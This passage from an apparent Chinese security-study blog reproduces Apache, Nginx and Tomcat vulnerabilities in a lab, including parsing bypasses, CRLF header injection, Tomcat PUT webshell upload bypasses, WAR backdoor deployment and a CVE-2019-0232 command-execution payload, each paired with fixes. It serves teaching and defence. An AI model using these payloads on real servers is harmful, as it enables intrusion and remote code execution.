<li>使用fastcgi模式与php结合的所有版本apache不存在此漏洞。</li>
<li> 利用此漏洞时必须保证扩展名中至少带有一个.php，不然将默认作为txt/html文档处理。</li>
</ol>
<p>我们再kali上复现此漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">sudo service apache2 restart 
cd /etc/apache2/mods-enabled 
sudo vi php7.4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211223154115032.png" alt="image-20211223154115032"></p>
<p>正则表达式中，$用来匹配字符串结尾位置。如果设置了RegExp对象的Multiline属性的条件下，还会匹配到字符串结尾的换行符”\n”或”\r”。</p>
<p>这里我们把$改为\.，即可做到此漏洞效果</p>
<p>修改后我们重启apache服务</p>
<p>firefox localhost 打开</p>
<p><img src="/2021/12/09/day36/image-20211223154753875.png" alt="image-20211223154753875"></p>
<p>看到作为php解析了</p>
<h4 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a>修复</h4><ol>
<li><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为*.php.*的访问权限：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch ".(php.|php3.|php4.|php5.)"&gt; 
Order Deny,Allow 
Deny from all 
&lt;/FilesMatch&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>如果需要保留此文件名，我们可以替换文件名中的.为_</p>
<pre class="line-numbers language-none"><code class="language-none">$filename = str_replace('.', '_', $filename);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ol>
<h3 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h3><h4 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h4><p>apache在解析文件时有一个原则，碰到不认识的扩展名就会向前解析，直到遇到认识的扩展名。如果都不认识，就会暴露源码。</p>
<p>apache在配置不当时就会导致解析漏洞</p>
<h4 id="复现-8"><a href="#复现-8" class="headerlink" title="复现"></a>复现</h4><p>在httpd.conf中 把下列注释去掉，后缀是存在.php .phtml都会解析成php文件</p>
<pre class="line-numbers language-none"><code class="language-none">AddType application/x-httpd-php .php .phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211223160551123.png" alt="image-20211223160551123"></p>
<p>修改后重启，在网站根目录下创建</p>
<p><img src="/2021/12/09/day36/image-20211223160744373.png" alt="image-20211223160744373"></p>
<p><img src="/2021/12/09/day36/image-20211223160753574.png" alt="image-20211223160753574"></p>
<p>可以看到作为php解析了</p>
<h4 id="修复-8"><a href="#修复-8" class="headerlink" title="修复"></a>修复</h4><ol>
<li><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为*.php.*的访问权限：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch ".(php.|php3.|php4.|php5.)"&gt; 
Order Deny,Allow 
Deny from all 
&lt;/FilesMatch&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>将配置不当的地方配置得当</p>
</li>
</ol>
<h3 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h3><h4 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h4><p>当客户端访问到一个目录时，Apache服务器将会默认寻找一个index list中的文件，若文 件不存在，则会列出当前目录下所有文件或返回403状态码，导致目录遍历。</p>
<h4 id="复现-9"><a href="#复现-9" class="headerlink" title="复现"></a>复现</h4><p>httpd.conf</p>
<pre class="line-numbers language-none"><code class="language-none">DocumentRoot "C:\phpStudy\WWW" 
&lt;Directory /&gt; 
Options +Indexes +FollowSymLinks +ExecCGI 
AllowOverride All 
Order allow,deny 
Allow from all 
Require all granted 
&lt;/Directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211223161355494.png" alt="image-20211223161355494"></p>
<p>这时，访问一个目录</p>
<p><img src="/2021/12/09/day36/image-20211223161458489.png" alt="image-20211223161458489"></p>
<p>可以看到是一个遍历的状态</p>
<p><img src="/2021/12/09/day36/image-20211223161643926.png" alt="image-20211223161643926"></p>
<h4 id="修复-9"><a href="#修复-9" class="headerlink" title="修复"></a>修复</h4><p>在httpd.conf文件中找到Options + Indexes + FollowSymLinks + ExecCGI并修改成Options -Indexes +FollowSymLinks + ExecCGI并保存（吧+修改为-）</p>
<pre class="line-numbers language-none"><code class="language-none">+ 允许目录浏览
- 进制目录浏览<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211223161843692.png" alt="image-20211223161843692"></p>
<p>重启服务后，刷新页面</p>
<p><img src="/2021/12/09/day36/image-20211223161908282.png" alt="image-20211223161908282"></p>
<p>看到进制目录遍历了</p>
<h3 id="HTTPD-换行解析漏洞-CVE-2017-15715"><a href="#HTTPD-换行解析漏洞-CVE-2017-15715" class="headerlink" title="HTTPD 换行解析漏洞(CVE-2017-15715)"></a>HTTPD 换行解析漏洞(CVE-2017-15715)</h3><h4 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h4><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。</p>
<p>其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0a将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<p>这里获取文件名是需要单独post一个name的，因为如果通过 $_FILES[‘file’][‘name’] 获取文件名的话，会把\x0a自动去除，所以 $_FILES[‘file’][‘name’] 这种方式获取文件名就不会造成这个漏洞</p>
<p>影响版本：apache ：2.4.0~2.4.29版本</p>
<h4 id="复现-10"><a href="#复现-10" class="headerlink" title="复现"></a>复现</h4><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt; 
&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;/head&gt; 
&lt;body&gt;
&lt;form action="" method="post" enctype="multipart/form-data"&gt; 
&lt;label for="file"&gt;文件名：&lt;/label&gt; 
&lt;input type="file" name="file" id="file"&gt;&lt;br&gt; 
&lt;input type="text" name="name" &lt;br&gt; 
&lt;input type="submit" name="submit" value="提交"&gt; 
&lt;/form&gt; 
&lt;/body&gt; 
&lt;/html&gt; 

&lt;br /&gt; 

&lt;?php 
if(isset($_FILES['file'])){ 
\#1.php php 
$name =basename($_POST['name']); 
$ext = pathinfo($name,PATHINFO_EXTENSION); 
$array=array('php','php3','php4','php5','phtml','pht'); 
if(in_array($ext,$array)){ 
exit('bad file'); 
}
move_uploaded_file($_FILES['file']['tmp_name'],'./'.$name); 
}
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>后台是通过黑名单方式过滤了php后缀的文件</p>
<p>如果设置了 RegExp对象的 Multiline属性，则也匹配 \n 或 \r恰好，我们在文件末尾加了0x0a（n），所以被匹配成功了。</p>
<blockquote>
<p>0x0a和0x0d</p>
<p>1.0x0d \r CR这三者代表是回车，是同一个东西，回车的作用只是移动光标至该行的起始位置 </p>
<p>2.0x0a \n CL这三者代表换行，是同一个东西，换行至下一行行首起始位置；</p>
</blockquote>
<p>打开</p>
<pre class="line-numbers language-none"><code class="language-none">sudo docker run -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=0.0.0.0 7ea558c9f385 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>同步镜像后，搜索CVE-2017-15715，下载，然后开启镜像</p>
<p>我们在本机创建一个upload.html，内容为上面的上传代码，action填入ip和镜像端口</p>
<p><img src="/2021/12/09/day36/image-20211223180936253.png" alt="image-20211223180936253"></p>
<p>之后我们上传一个1.txt，其中写入php代码</p>
<p>抓包</p>
<p><img src="/2021/12/09/day36/image-20211223181421959.png" alt="image-20211223181421959"></p>
<p>然后我们在hex修改，</p>
<p><img src="/2021/12/09/day36/image-20211223181609959.png" alt="image-20211223181609959"></p>
<p>修改后为换行符</p>
<p><img src="/2021/12/09/day36/image-20211223181750805.png" alt="image-20211223181750805"></p>
<p> 然后我们访问这个文件</p>
<p><img src="/2021/12/09/day36/image-20211223181709487.png" alt="image-20211223181709487"></p>
<p>无法访问，我们加上换行符%0a，才能访问</p>
<p><img src="/2021/12/09/day36/image-20211223181817175.png" alt="image-20211223181817175"></p>
<h4 id="修复-10"><a href="#修复-10" class="headerlink" title="修复"></a>修复</h4><ol>
<li>升级到最新版本</li>
<li>或将上传的文件重命名为为时间戳+随机数+.jpg的格式，并禁用上传文件目录执行</li>
</ol>
<h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><p>Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好。</p>
<h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><p>该漏洞是由于Nginx中php配置不当而造成的，<strong>与Nginx版本无关</strong>，但在高版本的php中，由于security.limit_extensions的引入，使得该漏洞难以被成功利用。</p>
<h4 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h4><p>Nginx的处理程序和FastCGI处理程序不同导致</p>
<p>Nginx拿到URL为/1.jpg/xxx.php后，识别处后缀是.php，认为是php文件，转交给PHP FastCGI处理程序去处理。PHP FastCGI处理程序识别该URI： /1.jpg/xxx.php不存在，按照PHP FastCGI处理程序自己的规则，删去最后的/xxx.php，又看/1.jpg存在，就将/1.jpg当成要执行的文件，就成功解析。</p>
<p>cgi.fix_pathinfo为php中的一个选项，默认开启为1，作用为修理路径，也就是对路径URL的处理规则</p>
<p><img src="/2021/12/09/day36/image-20211224113027867.png" alt="image-20211224113027867"></p>
<p>当php遇到文件路劲为/1.jpg/xxx.php/ss.001时，该文件不存在，会删除最后的/ss.001，再判断/1.jpg/xxx.php是否存在，若存在则将/1.jpg/xxx.php当作/1.jpg/xxx.php/ss.001文件，若不存在，则继续删除最后一个路径。删除的多余路径会存在PATH_INFO中，在这里为ss.001</p>
<p><img src="/2021/12/09/day36/image-20211224113038276.png" alt="image-20211224113038276"></p>
<h4 id="复现-11"><a href="#复现-11" class="headerlink" title="复现"></a>复现</h4><p>首先查看cgi.fix_pathinfo</p>
<p><img src="/2021/12/09/day36/image-20211224113206536.png" alt="image-20211224113206536"></p>
<p>默认为1，即存在此漏洞</p>
<p><img src="/2021/12/09/day36/image-20211224113122067.png" alt="image-20211224113122067"></p>
<h4 id="修复-11"><a href="#修复-11" class="headerlink" title="修复"></a>修复</h4><ol>
<li>将php.ini文件中的cgi.fix_pathinfo的值设置为0,这样php再解析1.php/1.jpg这样的目录时,只要1.jpg不存在就会显示404页面</li>
<li>php-fpm.conf中的security.limit_extensions后面的值设置为.php</li>
</ol>
<h3 id="目录遍历漏洞-1"><a href="#目录遍历漏洞-1" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h3><p>nginx的目录遍历跟apache一样，是配置不当引起的</p>
<h4 id="原理-12"><a href="#原理-12" class="headerlink" title="原理"></a>原理</h4><p>修改nginx.conf</p>
<p>修改为</p>
<pre class="line-numbers language-none"><code class="language-none">autoindex on; 开启目录浏览
autoindex off; 关闭目录浏览<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>默认是关闭状态</p>
<h4 id="复现-12"><a href="#复现-12" class="headerlink" title="复现"></a>复现</h4><p><img src="/2021/12/09/day36/image-20211224113627340.png" alt="image-20211224113627340"></p>
<p>重启</p>
<p><img src="/2021/12/09/day36/image-20211224114229729.png" alt="image-20211224114229729"></p>
<h4 id="修复-12"><a href="#修复-12" class="headerlink" title="修复"></a>修复</h4><p>设置autoindex off; 关闭目录浏览</p>
<h3 id="空字节代码执行漏洞"><a href="#空字节代码执行漏洞" class="headerlink" title="空字节代码执行漏洞"></a>空字节代码执行漏洞</h3><h4 id="原理-13"><a href="#原理-13" class="headerlink" title="原理"></a>原理</h4><p>在使用PHP-FastCGI执行php的时候，URL里面在遇到%00空字节时与FastCGI处理不一致，导致可在非php文件中嵌入php代码，通过访问url+%00.php来执行其中的php代码。</p>
<p>影响版本：</p>
<p>nginx 0.5.* </p>
<p>nginx 0.6.* </p>
<p>nginx 0.7 &lt;= 0.7.65 </p>
<p>nginx 0.8 &lt;= 0.8.37</p>
<p>所以我们在碰到nginx版本小于1可以考虑此漏洞</p>
<h4 id="复现-13"><a href="#复现-13" class="headerlink" title="复现"></a>复现</h4><p>在根目录下添加1.jpg</p>
<p><img src="/2021/12/09/day36/image-20211224114939413.png" alt="image-20211224114939413"></p>
<p>访问</p>
<p><img src="/2021/12/09/day36/image-20211224114958666.png" alt="image-20211224114958666"></p>
<p>抓包，由于此图片非正常，burp抓不到，所以我们在末尾添加..让其能被抓到</p>
<p><img src="/2021/12/09/day36/image-20211224115051319.png" alt="image-20211224115051319"></p>
<p>我们修改为/1.jpg..php，在hex修改，将第一个.的2e修改为00</p>
<p><img src="/2021/12/09/day36/image-20211224115314127.png" alt="image-20211224115314127"></p>
<p>其实就是%00</p>
<p><img src="/2021/12/09/day36/image-20211224115330205.png" alt="image-20211224115330205"></p>
<p>可以看到被解析为php了</p>
<h4 id="修复-13"><a href="#修复-13" class="headerlink" title="修复"></a>修复</h4><ol>
<li><p>在nginx虚拟机配置或fcgi.conf添加</p>
<pre class="line-numbers language-none"><code class="language-none">if ($request_filename ~* (.*)\.php) { 
set $php_url $1; 
}

if (!-e $php_url.php) { 
return 403; 
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>升级nginx版本</p>
</li>
</ol>
<h3 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h3><h4 id="原理-14"><a href="#原理-14" class="headerlink" title="原理"></a>原理</h4><p>Nginx将传入的url进行解码，对其中的%0a%0d替换成换行符，<strong>导致后面的数据注入至头部</strong>，造成CRLF注入漏洞。</p>
<h4 id="复现-14"><a href="#复现-14" class="headerlink" title="复现"></a>复现</h4><p>修改nginx.conf</p>
<pre class="line-numbers language-none"><code class="language-none">return 302 https://$host$uri; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211224115946834.png" alt="image-20211224115946834"></p>
<p>重启</p>
<p>这时我们构造url来注入进http头部</p>
<pre class="line-numbers language-none"><code class="language-none">http://192.168.0.161/%0ASet-cookie:JSPSESSID%3D3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211224120144805.png" alt="image-20211224120144805"></p>
<p>可以看到已经被注入进头部了</p>
<h4 id="修复-14"><a href="#修复-14" class="headerlink" title="修复"></a>修复</h4><p>安全的进行配置，删除刚才添加的不当的部分</p>
<h3 id="文件名逻辑漏洞-CVE-2013-4547"><a href="#文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="文件名逻辑漏洞(CVE-2013-4547)"></a>文件名逻辑漏洞(CVE-2013-4547)</h3><h4 id="原理-15"><a href="#原理-15" class="headerlink" title="原理"></a>原理</h4><p>非法字符空格和截止符（\0）会导致Nginx解析URL时混乱，此漏洞可导致目录跨越及代码执行</p>
<p>影响版本：nginx 0.8.41 – 1.5.6</p>
<h4 id="复现-15"><a href="#复现-15" class="headerlink" title="复现"></a>复现</h4><p>上传准备好的1.jpg文件，并在文件后加个空格</p>
<p><img src="/2021/12/09/day36/image-20211224131546052.png" alt="image-20211224131546052"></p>
<p>改为GET方式，访问该文件</p>
<p><img src="/2021/12/09/day36/image-20211224131816545.png" alt="image-20211224131816545"></p>
<p>文件后加俩个空格，然后加上.php，然后hex修改</p>
<p><img src="/2021/12/09/day36/image-20211224132432014.png" alt="image-20211224132432014"></p>
<p>然后发送就会看到被解析为php了</p>
<p><img src="/2021/12/09/day36/image-20211224132447018.png" alt="image-20211224132447018"></p>
<h4 id="修复-15"><a href="#修复-15" class="headerlink" title="修复"></a>修复</h4><p>升级版本</p>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>Apache Tomcat是美国阿帕奇（Apache）软件基金会的一款轻量级Web应用服务器。该程序实现了对Servlet和JavaServer Page（JSP）的支持。</p>
<h3 id="远程代码执行漏洞-CVE-2017-12615"><a href="#远程代码执行漏洞-CVE-2017-12615" class="headerlink" title="远程代码执行漏洞(CVE-2017-12615)"></a>远程代码执行漏洞(<strong>CVE-2017-12615</strong>)</h3><p>当 Tomcat运行在Windows操作系统时，启用了HTTP PUT请求方法且配置不当（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限</p>
<h4 id="原理-16"><a href="#原理-16" class="headerlink" title="原理"></a>原理</h4><p>当在Tomcat的conf（配置目录下）/web.xml配置文件中添加readonly设置为false时且允许put请求导致该漏洞产生</p>
<p><img src="/2021/12/09/day36/image-20211225104201613.png" alt="image-20211225104201613"></p>
<h4 id="复现-16"><a href="#复现-16" class="headerlink" title="复现"></a>复现</h4><p>拉取镜像启动</p>
<p><img src="/2021/12/09/day36/image-20211225111326628.png" alt="image-20211225111326628"></p>
<p>访问地址，抓包</p>
<p><img src="/2021/12/09/day36/image-20211225111408256.png" alt="image-20211225111408256"></p>
<p>将GET改为PUT，写入文件名和文件内容</p>
<p><img src="/2021/12/09/day36/image-20211225111605398.png" alt="image-20211225111605398"></p>
<p>可以看到上传成功了</p>
<p>有三种上传绕过，默认PUT+文件无法上传</p>
<pre class="line-numbers language-none"><code class="language-none">PUT /shell.jsp%20 

PUT /shell.jsp::$DATA 

PUT /shell.jsp/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="修复-16"><a href="#修复-16" class="headerlink" title="修复"></a>修复</h4><p>将readonly设置为true</p>
<h3 id="弱口令-amp-war远程部署"><a href="#弱口令-amp-war远程部署" class="headerlink" title="弱口令&amp;war远程部署"></a>弱口令&amp;war远程部署</h3><h4 id="原理-17"><a href="#原理-17" class="headerlink" title="原理"></a>原理</h4><p>在tomcat8环境下默认进入后台的密码为tomcat/tomcat，未修改造成未授权即可进入后台，或者管理员把密码设置成弱口令，进入管理后，可以上传war后门</p>
<h4 id="复现-17"><a href="#复现-17" class="headerlink" title="复现"></a>复现</h4><p><img src="/2021/12/09/day36/image-20211225112512113.png" alt="image-20211225112512113"></p>
<p>将shell.jsp压缩为zip，然后改zip为war</p>
<p><img src="/2021/12/09/day36/image-20211225112607186.png" alt="image-20211225112607186"></p>
<p>上传后找到上传路径</p>
<p><img src="/2021/12/09/day36/image-20211225112720101.png" alt="image-20211225112720101"></p>
<p>然后通过冰蝎连接</p>
<p><img src="/2021/12/09/day36/image-20211225113139465.png" alt="image-20211225113139465"></p>
<p>上传后会自动解压</p>
<h4 id="修复-17"><a href="#修复-17" class="headerlink" title="修复"></a>修复</h4><ol>
<li>设置强口令</li>
<li>删除manger</li>
</ol>
<h3 id="远程代码执行-CVE-2019-0232"><a href="#远程代码执行-CVE-2019-0232" class="headerlink" title="远程代码执行(CVE-2019-0232)"></a>远程代码执行(CVE-2019-0232)</h3><h4 id="原理-18"><a href="#原理-18" class="headerlink" title="原理"></a>原理</h4><p>由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击。</p>
<p>需要满足条件：</p>
<ol>
<li>系统为windows</li>
<li>启用CGI Servlet(默认是关闭的)</li>
<li>启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）</li>
</ol>
<p>影响版本：</p>
<p>Apache Tomcat 9.0.0.M1 - 9.0.17 </p>
<p>Apache Tomcat 8.5.0 - 8.5.39 </p>
<p>Apache Tomcat 7.0.0 - 7.0.93 </p>
<h4 id="复现-18"><a href="#复现-18" class="headerlink" title="复现"></a>复现</h4><p>我们搭建好tomcat后需要修改一些部分</p>
<p>在web.xml中，CGI_Servlet组件默认是关闭的，在 conf/web.xml 中找到注释的CGIServlet部分，去掉注释，并配置enableCmdLineArguments和executable</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>cgi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>org.apache.catalina.servlets.CGIServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>debug<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>

	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>cgiPathPrefix<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>WEB-INF/cgi-bin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>

	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>executable<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">&gt;</span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211225154209523.png" alt="image-20211225154209523"></p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>cgi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/cgi-bin/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211225154248510.png" alt="image-20211225154248510"></p>
<p>然后修改在conf/context.xml中的添加privileged=”true”语句</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Context</span> <span class="token attr-name">privileged</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>

    <span class="token comment">&lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;</span>
    <span class="token comment">&lt;!-- web application will be reloaded.                                   --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>WEB-INF/web.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>${catalina.base}/conf/web.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>WatchedResource</span><span class="token punctuation">&gt;</span></span>

    <span class="token comment">&lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;</span>
    <span class="token comment">&lt;!--
    &lt;Manager pathname="" /&gt;
    --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Context</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211225154323717.png" alt="image-20211225154323717"></p>
<p>在webapps-ROOT-WEB-INF下创建一个cgi-bin文件夹，并在文件夹内创建一个bat文件写入</p>
<pre class="line-numbers language-none"><code class="language-none">@echo off 
echo Content-Type: text/plain 
echo. 
set off=%~1 
%off% <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211225154432542.png" alt="image-20211225154432542"></p>
<p>完成在bin下双金startup.bat，然后访问8080端口</p>
<p><img src="/2021/12/09/day36/image-20211225154637638.png" alt="image-20211225154637638"></p>
<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">192.168.80.131:8080/cgi-bin/hello.bat?&amp;C%3A\Windows\System32\net user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211225154703925.png" alt="image-20211225154703925"></p>
<h4 id="修复-18"><a href="#修复-18" class="headerlink" title="修复"></a>修复</h4><p>升级版本</p>
<p>Apache Tomcat 9.0.18或更高版本 </p>
<p>Apache Tomcat 8.5.40或更高版本 </p>
<p>Apache Tomcat 7.0.93或更高版本</p>
<h3 id="反序列化漏洞-cve-2016-8735"><a href="#反序列化漏洞-cve-2016-8735" class="headerlink" title="反序列化漏洞(cve-2016-8735)"></a>反序列化漏洞(cve-2016-8735)</h3><p>该漏洞与之前Oracle发布的mxRemoteLifecycleListener反序列化漏洞（CVE-2016-3427）相关，是由于使用了JmxRemoteLifecycleListener的监听功能所导致。而在Oracle官方发布修复后，Tomcat未能及时修复更新而导致 的远程代码执行。</p>
<h4 id="原理-19"><a href="#原理-19" class="headerlink" title="原理"></a>原理</h4><p>Tomcat在配置JMX做监控时使用了JmxRemoteLifecycleListener的方法</p>
<p>影响版本：</p>
<p>ApacheTomcat 9.0.0.M1 到9.0.0.M11</p>
<p>ApacheTomcat 8.5.0 到8.5.6</p>
<p>ApacheTomcat 8.0.0.RC1 到8.0.38</p>
<p>ApacheTomcat 7.0.0 到7.0.72</p>
<p>ApacheTomcat 6.0.0 到6.0.47</p>
<h4 id="复现-19"><a href="#复现-19" class="headerlink" title="复现"></a>复现</h4><p>外部需要开启JmxRemoteLifecycleListener监听的10001和10002端口，来实现远程代码执行。</p>
<p>在conf/server.xml中第30行中配置启用JmxRemoteLifecycleListener功能监听的端口：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;Listener className="org.apache.catalina.mbeans.JmxRemoteLifecycleListener" rmiRegistryPortPlatform="10001" rmiServerPortPlatform="10002" /&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>修改bin\catalina.bat</p>
<p>在Execute The Requested Comman上面添加</p>
